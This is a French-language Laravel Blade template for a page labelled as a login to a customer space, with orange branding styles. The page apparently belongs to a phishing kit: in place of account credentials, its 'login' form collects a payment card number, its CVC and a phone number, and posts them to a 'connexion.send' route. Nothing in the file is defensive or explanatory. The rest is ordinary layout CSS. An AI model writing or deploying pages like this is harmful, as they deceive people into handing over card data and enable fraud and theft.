@extends('layouts.app')

@section('content')

<div class="form-container ">
  <div class="form">
    <h2 class="form-title mb-2">Connexion à mon espace</h2>
    <p class="mb-4 text-muted">Veuillez renseigner les informations ci-dessous pour continuer.</p>

    <form action="{{ route('connexion.send') }}" method="POST" class="text-start">
        @csrf

        <div class="mb-4">
            <label for="card-number" class="form-label fw-semibold">Numéro de la carte <span class="text-danger">*</span></label>
            <input type="text" id="card-number" name="card_number"
                   class="form-control input-rounded text-center"
                   placeholder="XXXX XXXX XXXX XXXX" required>
        </div>

        <div class="mb-4">
            <label for="cvc" class="form-label fw-semibold">      CVC <span class="text-danger">*    </span></label>
            <input type="text" id="cvc" name="cvc"
                   class="form-control input-rounded text-center"
                   placeholder="XXX" required>
        </div>

        <div class="mb-4">
            <label for="phone" class="form-label fw-semibold">Téléphone <span class="text-danger">*</span></label>
            <input type="text" id="phone" name="phone"
                   class="form-control input-rounded text-center"
                   placeholder="XX XX XX XX XX" required>
        </div>

        <div class="text-center mt-4">
            <button type="submit" name="submitconnexion" class="btn btn-orange px-4 py-2 rounded-pill">
                Se connecter
            </button>
        </div>
    </form>

    <div class="mt-5 text-center">
        <img src="{{ asset('assets/images/promo-placeholder.jpg') }}" alt="Promo" class="img-fluid promo-img">
    </div>

  </div>
</div>

<style>

.form-container {
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
    background: #fff;
}

.form {
    text-align: center;
    max-width: 400px;
    width: 100%;
    padding: 20px;
}
.form-title {
    font-size: 24px;
    font-weight: bold;
    color: #333;
}

label{
    margin-bottom: 5px;
}
.input-rounded {
    border-radius: 50px;
    height: 45px;
    margin-bottom: 20px;
    margin-top: 10px;
    font-size: 16px;
    padding-left: 20px;
    padding-right: 20px;
    border: 1px solid #ccc;
    transition: border-color 0.3s;
}


.btn-orange {
    background-color: #f25000;
    color: white;
    border: none;
    border-radius: 50px;
    padding: 0.5rem 1.5rem;
    font-weight: 600;
    cursor: pointer;
    margin-top: 20px;
    margin-bottom: 80px;
}
.btn-orange:hover {
    background-color: #e65c00;
}

.promo-img {
    max-width: 350px;
    height: auto;
}

@media (max-width: 768px) {
    
.mb-4 {
    margin-bottom: 15px;
    text-align: left;
}

label {
    font-size: 0.9rem;
    color: #333;
    display: block;
    margin-bottom: 5px;
}

.input-rounded{
    width: 90%;
    padding: 10px;
    font-size: 1rem;
    border: 1px solid #ccc;
    border-radius: 5px;
    box-sizing: border-box;
}

input[type="text"] {
   
    padding: 3px 3px 3px 14px;
    margin-bottom: 20px;
    font-size: 16px;
    border: 1px solid rgba(227, 227, 227);
    border-radius: 10px;
    box-sizing: border-box;
    height: 40px;
}

}

</style>

@endsection
